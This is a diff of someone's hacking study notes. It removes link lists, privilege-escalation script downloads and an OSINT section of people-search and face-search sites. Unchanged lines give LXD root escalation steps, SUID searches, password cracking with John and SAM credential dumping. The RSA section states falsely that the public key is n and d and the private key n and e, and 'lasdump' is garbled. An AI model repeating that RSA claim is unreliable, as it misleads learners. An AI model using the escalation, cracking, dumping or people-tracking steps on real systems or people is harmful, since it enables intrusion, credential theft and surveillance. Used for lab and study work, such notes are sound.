@@ -242,12 +242,6 @@ Random notes I've made while learning about hacking that might prove useful in t
 - `find / -perm -u=s -type f 2>/dev/null`
 - `find / -perm 4000 2>/dev/null`
 
-### Useful links
-- GTFOBins: https://gtfobins.github.io/
-- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
-- https://payatu.com/guide-linux-privilege-escalation
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation
-
 ### Privesc with LXD
 - check if the user is member of lxd group: `id`
 - on attacking machine:
@@ -265,16 +259,8 @@ Random notes I've made while learning about hacking that might prove useful in t
 - `lxc start CONTAINERNAME`
 - `lxc exec CONTAINERNAME /bin/sh`
 - mount storage and verity root escalation: `id` and `cd /mnt/root/root`
-- more info here: https://www.hackingarticles.in/lxd-privilege-escalation/
-
-### Useful privesc scripts
-- LinEnum.sh, download: `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
-- LinPEAS: `wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh`
-- linuxprivchecker.py
-- unixprivesc.py
 
 ## Images
-- http://exif.regex.info/exif.cgi
 - check metadata of image: `exiftool image.png`
 
 ## SSH Brute Force
@@ -386,7 +372,6 @@ Some other important instructions:
 
 ## Decrypting hashes with john the ripper
 - `john hash.txt`
-- example hashes: https://hashcat.net/wiki/doku.php?id=example_hashes
 - search formats: `john --list=formats | grep -i 'md5'`
 - crack: `john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
 
@@ -611,39 +596,9 @@ Output file contents:
 - `log hash.txt`
 - `lasdump::sam SYSTEM SAM`
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
-# OSINT
-
-## Data breach search
-- https://haveibeenpwned.com/
-- https://scylla.sh/
-- https://dehashed.com/ (wel betaald)
-
-## grep.app
-- Tool om Git repositories te doorzoeken.
-
-## RevealName.com
-- Reveals someone's phone number
-
-## Username find tools
-- https://namechk.com/
-- https://whatsmyname.app/
-- https://namecheckup.com/
-- https://github.com/WebBreacher/WhatsMyName
-- https://github.com/sherlock-project/sherlock
-
-## Reverse Image Search
-- https://google.com
-- https://tineye.com/
-- https://www.bing.com/visualsearch?FORM=ILPVIS
-- https://yandex.com/images/
-- https://pimeyes.com
----------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Crypto
-- useful site: rumkin.com/tools
 
 ## RSA
-- useful tool: https://github.com/Ganapati/RsaCtfTool
-- other useful tool: https://github.com/ius/rsatool
 - p and q are large prime numbers
 - n is the product of p and q
 - The public key is n and d, the private key is n and e.
@@ -678,11 +633,3 @@ Output file contents:
 - find malicious code and dump: `volatility -f MEMORY_FILE.raw --profile=PROFILE malfind -D <Destination Directory>`
 - list all of the DLLs in memory: `volatility -f MEMORY_FILE.raw --profile=PROFILE dlllist`
 - dump the DLL's from memory with specific process ID: `volatility -f MEMORY_FILE.raw --profile=PROFILE --pid=PID dlldump -D <Destination Directory>`
----------------------------------------------------------------------------------------------------------------------------------------------------------------
-# Other
-- Create files in /dev/shm. This is empied during reboot, so you don’t have to clean up.
-- Output errors to the ‘bitbucket’ 2>/dev/null
-- Back to previous folder: `cd -`
-- Sometimes, useful information is stored in the SSL certificate
-- Use FoxyProxy Firefox browser addon to easily enable the Burp proxy
-- Obfuscated but filled in passwords in the browser can still be seen via the inspector function
